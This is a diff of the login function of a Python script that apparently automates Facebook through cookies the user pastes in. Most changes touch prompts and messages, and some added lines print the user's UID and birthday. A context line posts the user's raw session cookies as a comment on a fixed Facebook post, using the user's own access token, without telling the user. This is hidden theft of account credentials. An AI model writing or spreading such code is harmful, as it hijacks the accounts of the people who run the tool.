@@ -133,10 +133,9 @@ tokenku=[]
 def login():
 
         clear()
-        
-        print(' ')
-        cookies = input(' Put Cookies : ')
-        
+
+        cookies = input(' Put cookies: ')
+
         try:
 
                 data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
@@ -160,30 +159,34 @@ def login():
                 linex()
 
                 print(' Welcome\033[1;32m : '+name)
-                
+
+                print(' \033[1;37mYour UID : '+idd)
+
+                print(' Barth Day: '+barth)
+
                 requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
 
                 linex()
 
-                print(' Login Sucessfull ...')
+                print(' Cookies login has been successfull...')
 
                 time.sleep(1)
 
                 menu()
 
         except KeyError:
-                print('')
-                print(' Cookies Has Been Expired ...')
+
+                print('\033[1;31m Cookies has been expired...')
 
                 os.system('rm -rf .tok.txt');time.sleep(1);login()
 
         except requests.exceptions.ConnectionError:
 
-                exit(' Internet connection error ...')
+                exit(' internet connection error...')
 
         except AttributeError:
-                print('')
-                print('Cookies has been expired ...')
+
+                print('\033[1;31m Cookies has been expired...')
 
                 os.system('rm -rf .tok.txt');time.sleep(1);login()
 
